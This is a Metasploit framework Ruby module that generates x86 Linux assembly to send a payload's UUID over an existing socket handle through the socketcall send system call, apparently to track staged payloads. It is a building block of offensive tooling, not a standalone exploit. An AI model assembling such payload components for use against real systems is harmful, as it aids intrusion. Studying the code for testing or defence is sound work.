# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/uuid'

module Msf

###
#
# Basic send_uuid stub for Linux ARCH_X86 payloads
#
###

module Payload::Linux::SendUUID

  #
  # Generate assembly code that writes the UUID to the socket.
  #
  # This code assumes that the communications socket handle is in edi.
  #
  def asm_send_uuid(uuid=nil)
    uuid ||= generate_payload_uuid
    uuid_raw = uuid.to_raw

    asm =%Q^
      send_uuid:
        push ebx                      ; store ebx for later
        push ecx                      ; store ecx for later
        push 0                        ; terminate the args array
        push #{uuid_raw.length}       ; length of the UUID
        call get_uuid_address         ; put uuid buffer on the stack
        db #{raw_to_db(uuid_raw)}     ; UUID itself
      get_uuid_address:
        push edi                      ; socket handle
        mov ecx, esp                  ; store the pointer to the argument arra
        push 0x9                      ; SYS_SEND
        pop ebx
        push 0x66                     ; sys_socketcall
        pop eax
        int 0x80
        add esp, 16                   ; put the stack back how it was
        pop ecx                       ; restore ecx
        pop ebx                       ; restore ebx
    ^

    asm
  end

end

end

